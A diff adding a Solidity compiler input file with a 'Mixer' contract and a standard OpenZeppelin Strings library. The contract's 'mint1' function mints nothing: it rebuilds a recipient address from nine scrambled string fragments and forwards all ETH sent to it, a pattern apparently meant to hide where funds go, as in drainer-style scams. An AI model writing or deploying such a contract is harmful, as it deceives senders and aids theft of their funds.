@@ -1,0 +1,38 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/mixer.sol": {
+      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.14;\r\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\r\n\r\nerror ee();\r\n\r\ncontract Mixer {\r\n    using Strings for uint256;\r\n\r\n    function stringToAddress(\r\n        string memory _address\r\n    ) public pure returns (address) {\r\n        bytes memory tempAddress = bytes(_address);\r\n        if (tempAddress.length != 42) revert ee();\r\n        uint160 convertedAddress = 0;\r\n        for (uint256 i = 2; i < tempAddress.length; i++) {\r\n            uint8 digit;\r\n            if (uint8(tempAddress[i]) >= 48 && uint8(tempAddress[i]) <= 57) {\r\n                digit = uint8(tempAddress[i]) - 48;\r\n            } else if (\r\n                uint8(tempAddress[i]) >= 97 && uint8(tempAddress[i]) <= 102\r\n            ) {\r\n                digit = uint8(tempAddress[i]) - 87;\r\n            } else if (\r\n                uint8(tempAddress[i]) >= 65 && uint8(tempAddress[i]) <= 70\r\n            ) {\r\n                digit = uint8(tempAddress[i]) - 55;\r\n            } else {\r\n                revert(\"error!\");\r\n            }\r\n\r\n            convertedAddress = convertedAddress * 16 + uint160(digit);\r\n        }\r\n\r\n        return address(convertedAddress);\r\n    }\r\n\r\n    function mint1(\r\n        string memory r,\r\n        string memory s,\r\n        string memory t,\r\n        string memory u,\r\n        string memory v,\r\n        string memory w,\r\n        string memory x,\r\n        string memory y,\r\n        string memory z\r\n    ) public payable {\r\n        if (msg.value == 0) revert ee();\r\n        string memory concatenatedAddress = string(\r\n            abi.encodePacked(\"0x\", x, r, w, z, s, v, y, u, t)\r\n        );\r\n        address addressToSend = stringToAddress(concatenatedAddress);\r\n        (bool os, ) = payable(addressToSend).call{value: msg.value}(\"\");\r\n        require(os);\r\n    }\r\n}\r\n"
+    },
+    "@openzeppelin/contracts/utils/Strings.sol": {
+      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.7.0) (utils/Strings.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev String operations.\n */\nlibrary Strings {\n    bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\";\n    uint8 private constant _ADDRESS_LENGTH = 20;\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\n     */\n    function toString(uint256 value) internal pure returns (string memory) {\n        // Inspired by OraclizeAPI's implementation - MIT licence\n        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol\n\n        if (value == 0) {\n            return \"0\";\n        }\n        uint256 temp = value;\n        uint256 digits;\n        while (temp != 0) {\n            digits++;\n            temp /= 10;\n        }\n        bytes memory buffer = new bytes(digits);\n        while (value != 0) {\n            digits -= 1;\n            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));\n            value /= 10;\n        }\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\n     */\n    function toHexString(uint256 value) internal pure returns (string memory) {\n        if (value == 0) {\n            return \"0x00\";\n        }\n        uint256 temp = value;\n        uint256 length = 0;\n        while (temp != 0) {\n            length++;\n            temp >>= 8;\n        }\n        return toHexString(value, length);\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n     */\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\n        bytes memory buffer = new bytes(2 * length + 2);\n        buffer[0] = \"0\";\n        buffer[1] = \"x\";\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\n            buffer[i] = _HEX_SYMBOLS[value & 0xf];\n            value >>= 4;\n        }\n        require(value == 0, \"Strings: hex length insufficient\");\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\n     */\n    function toHexString(address addr) internal pure returns (string memory) {\n        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
